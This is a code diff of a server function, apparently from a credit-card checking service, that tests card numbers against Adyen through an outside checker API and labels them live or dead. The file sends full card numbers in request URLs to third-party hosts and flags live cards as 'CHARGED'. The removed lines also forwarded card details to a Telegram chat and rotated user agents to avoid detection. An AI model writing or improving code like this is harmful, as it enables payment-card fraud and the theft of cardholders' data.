@@ -39,70 +39,25 @@ const notifyChargedCard = (
   }).catch((err) => console.error("[ADYEN-AUTH] notify-charged-card error:", err));
 };
 
-const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
-  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
-  const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
-  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;
-
-  const message = `🔍 <b>Adyen Auth Debug</b>\n\n` +
-    `<b>Card:</b> <code>${cardDetails}</code>\n` +
-    `<b>Status:</b> UNKNOWN\n\n` +
-    `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;
-
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: ADMIN_TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: "HTML",
-    }),
-  }).catch((err) => console.error("[ADYEN-AUTH] admin debug error:", err));
-};
-
-const userAgents = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-];
-
-const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
-
 const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
-  const success = data?.success;
-  const message = (data?.message as string)?.toLowerCase() || '';
-  const status = (data?.status as string)?.toUpperCase() || '';
+  const status = String(data?.status || '').toLowerCase();
 
-  if (success === true) return "live";
-  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') return "live";
-
-  if (success === false) return "dead";
-  if (status === 'ERROR' || status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') return "dead";
-  if (message.includes("declined") || message.includes("insufficient") || message.includes("invalid") ||
-      message.includes("expired") || message.includes("do not honor") || message.includes("incorrect") ||
-      message.includes("error") || message.includes("failed")) return "dead";
+  if (status === 'approved') return "live";
+  if (status === 'declined') return "dead";
 
   return "unknown";
 };
 
-const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
-  const maxRetries = 3;
-  const apiUrl = `https://ayden-production.up.railway.app/cc=${cc}`;
+const performCheck = async (cc: string, attempt: number = 1): Promise<Record<string, unknown>> => {
+  const maxRetries = 5;
+  const apiUrl = `https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc=${cc}`;
 
   console.log(`[ADYEN-AUTH] Attempt ${attempt}/${maxRetries} - Calling API`);
 
   try {
     const response = await fetch(apiUrl, {
       method: 'GET',
-      headers: {
-        'User-Agent': userAgent,
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-      }
+      headers: { 'Accept': 'application/json, text/plain, */*' },
     });
 
     const rawText = await response.text();
@@ -112,21 +67,21 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     try {
       data = JSON.parse(rawText);
     } catch {
-      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
+      data = { raw: rawText, status: "unknown", message: "Failed to parse response" };
     }
 
     const computedStatus = getStatusFromResponse(data);
-    const apiMessage = data.message || 'No response message';
+    const apiMessage = data.message || data.response || data.status || 'No response message';
 
     if (computedStatus === "unknown" && attempt < maxRetries) {
       console.log(`[ADYEN-AUTH] UNKNOWN on attempt ${attempt}, retrying...`);
       await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-      return performCheck(cc, getRandomUserAgent(), attempt + 1);
+      return performCheck(cc, attempt + 1);
     }
 
     return {
       computedStatus,
-      apiStatus: data.status || 'UNKNOWN',
+      apiStatus: String(data.status || 'UNKNOWN').toUpperCase(),
       apiMessage,
       rawResponse: rawText,
     };
@@ -135,7 +90,7 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
 
     if (attempt < maxRetries) {
       await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-      return performCheck(cc, getRandomUserAgent(), attempt + 1);
+      return performCheck(cc, attempt + 1);
     }
 
     const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
@@ -187,14 +142,10 @@ serve(async (req) => {
 
     console.log('[ADYEN-AUTH] Checking card for user:', user.id);
 
-    const data = await performCheck(cc, getRandomUserAgent());
+    const data = await performCheck(cc);
 
     if (data.computedStatus === 'live') {
       notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'LIVE'), '$0.00', 'Adyen Auth');
-    }
-
-    if (data.computedStatus === 'unknown') {
-      sendAdminDebug(cc, String(data.rawResponse || ''));
     }
 
     return new Response(JSON.stringify(data),
